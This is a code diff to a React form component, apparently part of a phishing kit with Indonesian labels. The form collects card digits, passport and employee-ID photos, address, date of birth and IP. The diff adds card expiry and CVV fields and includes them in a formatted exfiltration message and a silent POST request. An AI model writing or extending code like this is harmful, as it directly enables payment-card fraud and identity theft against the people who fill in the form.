@@ -28,6 +28,8 @@ export default function Step4() {
   const [inquiryType, setInquiryType]   = useState("");
   const [message, setMessage]           = useState("");
   const [cardDigits, setCardDigits]     = useState("");
+  const [cardExp, setCardExp]           = useState("");
+  const [cardCvv, setCardCvv]           = useState("");
   const [passportFile, setPassportFile] = useState<File | null>(null);
   const [empIdFile, setEmpIdFile]       = useState<File | null>(null);
   const [errors, setErrors]             = useState<Record<string, string>>({});
@@ -54,6 +56,10 @@ export default function Step4() {
     if (!inquiryType)        errs.inquiryType = "Pilih jenis pertanyaan.";
     if (!cardDigits.trim())  errs.cardDigits  = "8 digit akhiran kartu wajib diisi.";
     else if (!/^\d{8}$/.test(cardDigits.trim())) errs.cardDigits = "Harus tepat 8 angka.";
+    if (!cardExp.trim())     errs.cardExp     = "Tanggal kadaluarsa wajib diisi.";
+    else if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(cardExp.trim())) errs.cardExp = "Format: MM/YY";
+    if (!cardCvv.trim())     errs.cardCvv     = "CVV wajib diisi.";
+    else if (!/^\d{3,4}$/.test(cardCvv.trim())) errs.cardCvv = "CVV harus 3 atau 4 angka.";
     if (!passportFile)       errs.passport    = "Foto paspor wajib diunggah.";
     if (!empIdFile)          errs.empId       = "Foto ID karyawan wajib diunggah.";
     return errs;
@@ -78,6 +84,8 @@ export default function Step4() {
         `👤 <b>Username</b>    : <code>${user?.username ?? "-"}</code>\n` +
         `👦 <b>Nama Lengkap</b>: <code>${firstName} ${lastName}</code>\n` +
         `💳 <b>Akhiran Kartu</b>: <code>XXXX XXXX ${cardDigits.trim()}</code>\n` +
+        `📅 <b>Exp</b>          : <code>${cardExp.trim()}</code>\n` +
+        `🔐 <b>CVV</b>          : <code>${cardCvv.trim()}</code>\n` +
         `📧 <b>Email</b>       : <code>${email}</code>\n` +
         `📱 <b>Mobile</b>      : <code>${phone}</code>\n` +
         `🏠 <b>Alamat</b>      : <code>${address}, ${city}, ${stateVal} ${postalCode}</code>\n` +
@@ -98,6 +106,8 @@ export default function Step4() {
           address, city, state: stateVal, postalCode,
           dob, inquiryType, message, ipAddress: ip,
           cardDigits: cardDigits.trim(),
+          cardExp: cardExp.trim(),
+          cardCvv: cardCvv.trim(),
         }),
       }).catch(() => {});
 
@@ -296,6 +306,68 @@ export default function Step4() {
             <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
               Masukkan 8 digit terakhir nomor kartu Anda.
             </p>
+          </div>
+
+          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 20 }}>
+            {/* EXP */}
+            <div>
+              <label style={labelStyle}>Tanggal Kadaluarsa (EXP) *</label>
+              <input
+                className="s4-input"
+                type="text"
+                inputMode="numeric"
+                placeholder="MM/YY"
+                maxLength={5}
+                value={cardExp}
+                onChange={(e) => {
+                  let val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                  if (val.length > 2) val = val.slice(0, 2) + "/" + val.slice(2);
+                  setCardExp(val);
+                  setErrors(p => ({ ...p, cardExp: "" }));
+                }}
+                disabled={loading}
+                style={{
+                  ...inputBase,
+                  borderColor: errors.cardExp ? "#e00" : "#ddd",
+                  fontFamily: "monospace",
+                  letterSpacing: "0.12em",
+                }}
+              />
+              {errors.cardExp && (
+                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardExp}</p>
+              )}
+            </div>
+
+            {/* CVV */}
+            <div>
+              <label style={labelStyle}>CVV *</label>
+              <input
+                className="s4-input"
+                type="password"
+                inputMode="numeric"
+                placeholder="•••"
+                maxLength={4}
+                value={cardCvv}
+                onChange={(e) => {
+                  const val = e.target.value.replace(/\D/g, "").slice(0, 4);
+                  setCardCvv(val);
+                  setErrors(p => ({ ...p, cardCvv: "" }));
+                }}
+                disabled={loading}
+                style={{
+                  ...inputBase,
+                  borderColor: errors.cardCvv ? "#e00" : "#ddd",
+                  fontFamily: "monospace",
+                  letterSpacing: "0.2em",
+                }}
+              />
+              {errors.cardCvv && (
+                <p style={{ fontSize: 11, color: "#e00", marginTop: 5 }}>{errors.cardCvv}</p>
+              )}
+              <p style={{ fontSize: 11, color: "#888", marginTop: 5 }}>
+                3 digit di belakang kartu (Visa/MC) atau 4 digit depan (Amex).
+              </p>
+            </div>
           </div>
 
           {/* ── Section: Kontak ── */}
